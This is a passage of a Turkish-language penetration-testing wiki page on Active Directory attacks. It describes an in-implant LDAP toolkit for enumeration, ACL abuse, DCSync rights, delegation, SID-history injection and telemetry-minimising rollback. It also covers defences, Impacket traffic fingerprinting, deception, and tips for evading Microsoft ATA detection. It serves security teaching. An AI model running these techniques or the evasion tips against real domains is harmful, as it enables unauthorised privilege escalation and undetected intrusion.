[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection), bloodyAD-style LDAP primitive'lerini tamamen on-host implant (ör. Adaptix C2) içinde çalışan x64 Beacon Object File'lar olarak yeniden uygular. Operator'lar pack'i `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` ile compile eder, `ldap.axs` dosyasını load eder ve ardından beacon'dan `ldap <subcommand>` çağırır. Tüm traffic, LDAP (389) üzerinden signing/sealing ile veya auto certificate trust özellikli LDAPS (636) üzerinden mevcut logon security context'i kullanır; bu nedenle socks proxy'lerine veya disk artifact'larına gerek duyulmaz.<sup>[[4]](#references)</sup>

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` ve `get-groupmembers`, short name'leri/OU path'lerini full DN'lere resolve eder ve ilgili object'leri dump eder.
- `get-object`, `get-attribute` ve `get-domaininfo`, arbitrary attribute'ları (security descriptor'lar dahil) ve `rootDSE` üzerinden forest/domain metadata'sını çeker.
- `get-uac`, `get-spn`, `get-delegation` ve `get-rbcd`, roasting candidate'larını, delegation ayarlarını ve mevcut [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptor'larını doğrudan LDAP üzerinden gösterir.
- `get-acl` ve `get-writable --detailed`, trustee'leri, right'ları (GenericAll/WriteDACL/WriteOwner/attribute write'ları) ve inheritance'ı listelemek için DACL'ı parse eder ve ACL privilege escalation için immediate target'lar sağlar.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Escalation & persistence için LDAP yazma primitive'leri

- Object creation BOF'ları (`add-user`, `add-computer`, `add-group`, `add-ou`), OU haklarının bulunduğu her yerde operatörün yeni principal'lar veya machine account'lar hazırlamasına olanak tanır. `add-groupmember`, `set-password`, `add-attribute` ve `set-attribute`, write-property hakları bulunduğunda hedefleri doğrudan ele geçirir.
- `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` ve `add-dcsync` gibi ACL odaklı komutlar, herhangi bir AD object'i üzerindeki WriteDACL/WriteOwner haklarını; PowerShell/ADSI artifact'leri bırakmadan password reset'leri, group membership kontrolünü veya DCSync replication ayrıcalıklarını mümkün kılacak şekilde kullanır. `remove-*` karşılıkları, eklenen ACE'leri temizler.

### Delegation, roasting ve Kerberos abuse

- `add-spn`/`set-spn`, ele geçirilmiş bir user'ı anında Kerberoastable hâle getirir; `add-asreproastable` (UAC toggle), password'a dokunmadan onu AS-REP roasting için işaretler.
- Delegation macro'ları (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`), beacon üzerinden `msDS-AllowedToDelegateTo`, UAC flag'lerini veya `msDS-AllowedToActOnBehalfOfOtherIdentity` değerini yeniden yazarak constrained/unconstrained/RBCD attack path'lerini etkinleştirir ve remote PowerShell veya RSAT gereksinimini ortadan kaldırır.

### sidHistory injection, OU relocation ve attack surface şekillendirme

- `add-sidhistory`, kontrol edilen bir principal'ın SID history'sine ayrıcalıklı SID'ler ekler (bkz. [SID-History Injection](sid-history-injection.md)); bu, tamamen LDAP/LDAPS üzerinden stealthy access inheritance sağlar.
- `move-object`, computer veya user'ların DN/OU değerini değiştirir ve attacker'ın, `set-password`, `add-groupmember` veya `add-spn` abuse edilmeden önce asset'leri delegated rights'ın zaten bulunduğu OU'lara taşımasına olanak tanır.
- Sıkı kapsamlı removal komutları (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` vb.), operatör credential'ları veya persistence'ı elde ettikten sonra hızlı rollback yapılmasına olanak tanıyarak telemetry'yi en aza indirir.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Bazı Genel Savunmalar

[**Credential'ları nasıl koruyacağınız hakkında daha fazla bilgi edinin.**](../stealing-credentials/credentials-protections.md)

### **Credential Protection için Defensive Measures**

- **Domain Admins Restrictions**: Domain Admins'in yalnızca Domain Controller'lara login olmasına izin verilmesi, diğer host'larda kullanılmalarının önlenmesi önerilir.
- **Service Account Privileges**: Güvenliği korumak için servisler Domain Admin (DA) ayrıcalıklarıyla çalıştırılmamalıdır.
- **Temporal Privilege Limitation**: DA ayrıcalıkları gerektiren görevlerde bu ayrıcalıkların süresi sınırlanmalıdır. Bu, şu şekilde gerçekleştirilebilir: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event ID 2889/3074/3075'i denetleyin ve ardından LDAP MITM/relay girişimlerini engellemek için DC'lerde/client'larda LDAP signing ile LDAPS channel binding'i zorunlu kılın.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket activity için protocol-level fingerprinting

Yaygın AD tradecraft'ını tespit etmek istiyorsanız, renamed binary'ler, service name'ler, temp batch file'ları veya output path'leri gibi **operator-controlled artifact'lara** yalnızca güvenmeyin. Meşru Windows client'larının [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC ve WMI traffic'ini nasıl oluşturduğunu baseline'layın; ardından operatör `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` veya `ntlmrelayx.py` dosyalarını düzenlese bile kalan **implementation quirk**'lerini arayın.<sup>[[8]](#references)</sup>

- **Kendi baseline'ınızla doğruladıktan sonra high-confidence standalone candidate'lar**:
- `auth_context_id = 79231 + ctx_id` kullanan authenticated DCE/RPC
- `0xff` ile doldurulmuş DCE/RPC authentication padding
- Raw Kerberos `AP-REQ` değerini doğrudan SPNEGO `mechToken` içine yerleştiren LDAP Kerberos bind'leri
- ASCII görünümlü `ClientGuid` değerlerine sahip SMB2/3 negotiate request'leri
- Standart olmayan `//./root/cimv2` namespace'ini kullanan WMI `IWbemLevel1Login::NTLMLogin`
- Hardcoded Kerberos nonce değerleri
- **Correlation/scoring feature olarak kullanılması daha uygun olanlar**:
- Sparse veya duplicated Kerberos etype list'leri, alışılmadık/eksik `PA-DATA` veya native Windows'tan farklı TGS-REQ etype ordering
- Version info içermeyen NTLM Type 1 message'ları veya null host name içeren Type 3 message'ları
- SPNEGO yerine DCE/RPC içinde taşınan raw NTLMSSP, eksik DCE/RPC verification trailer'ları veya SPNEGO/Kerberos OID mismatch'leri
- Aynı host/user/session/time window'dan gelen bu özelliklerin birkaçı, tek bir zayıf field'dan çok daha güçlüdür
- **Standalone alert yerine enrichment olarak kullanın**:
- Default filename'ler, output path'leri, random service name'ler, temporary batch name'leri, default computer account name'leri ve tool-specific HTTP/WebDAV/RDP/MSSQL string'leri
- Bunların operatörler tarafından değiştirilmesi kolaydır; en iyi şekilde bir cross-protocol cluster'ın neden şüpheli olduğunu açıklamak için kullanılırlar
- **Operational notes**:
- Bu sinyallerin bazıları decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW veya service-side visibility gerektirir
- Alert'lara dönüştürmeden önce Samba/Linux client'ları, appliance'ları ve legacy software'ı baseline'a göre doğrulayın
- Baseline'a olan güveninizi artırdıkça detection'ları enrichment -> hunting -> alerting aşamalarında ilerletin

### **Deception Techniques'in uygulanması**

- Deception uygulamak; expire olmayan veya Trusted for Delegation olarak işaretlenmiş password'lara sahip decoy user ya da computer'lar gibi tuzaklar kurmayı içerir. Ayrıntılı bir yaklaşım, belirli haklara sahip user'lar oluşturmayı veya bunları high privilege group'lara eklemeyi kapsar.<sup>[[2]](#references)</sup>
- Pratik bir örnek şu araçların kullanımını içerir: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception techniques'in deploy edilmesi hakkında daha fazla bilgiye [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) adresinden ulaşılabilir.

### **Deception'ın tespit edilmesi**

- **User Objects için**: Şüpheli göstergeler arasında atypical ObjectSID, seyrek logon'lar, creation date'leri ve düşük bad password count'ları bulunur.
- **General Indicators**: Potansiyel decoy object'lerin attribute'larını gerçek object'lerinkilerle karşılaştırmak tutarsızlıkları ortaya çıkarabilir. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) gibi araçlar bu deception'ları belirlemeye yardımcı olabilir.

### **Detection Systems'ın atlatılması**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection'ını önlemek için Domain Controller'lar üzerinde session enumeration'dan kaçınma.
- **Ticket Impersonation**: Ticket oluşturma için **aes** key'lerinin kullanılması, NTLM'e downgrade yapılmasını önleyerek detection'dan kaçmaya yardımcı olur.
- **DCSync Attacks**: ATA detection'ından kaçınmak için işlemlerin Domain Controller olmayan bir sistemden gerçekleştirilmesi önerilir; doğrudan bir Domain Controller'dan gerçekleştirmek alert'leri tetikler.

## References

- [1] [Domain Trust'larına Saldırı Rehberi](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active Directory'de Deception için Trust'ların Forging Edilmesi](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain Admin'den Enterprise Admin'e](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – Active Directory Exploitation için In-Memory LDAP Toolkit](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM Hash'lerini Wordlist Olarak Weaponize Etmek](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket'ın İncelenmesi](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Netlogon üzerinden Active Directory Account'larını Ele Geçirme](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472 ile ilişkili Netlogon güvenli channel connection değişiklikleri nasıl yönetilir](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Unutulmuş Null Session ve MS-RPC interface'lerine bir yolculuk](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Domain'ler arasında güvenlik sınırı olarak SID filter mı? (Bölüm 4) - SID filtering bypass araştırması](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Domain'ler arasında güvenlik sınırı olarak SID filter mı? (Bölüm 5) - Golden GMSA trust attack - child'dan parent'a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Domain'ler arasında güvenlik sınırı olarak SID filter mı? (Bölüm 6) - Schema change trust attack - child'dan parent'a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5 ile DA'dan EA'ya](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CS abuse ederek child domain admin'lerinden enterprise admin'lerine 5 dakikada escalation, devam yazısı](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Active Directory DACL Backdoor'larını Tasarlamak](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [NetExec pre2k module source](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
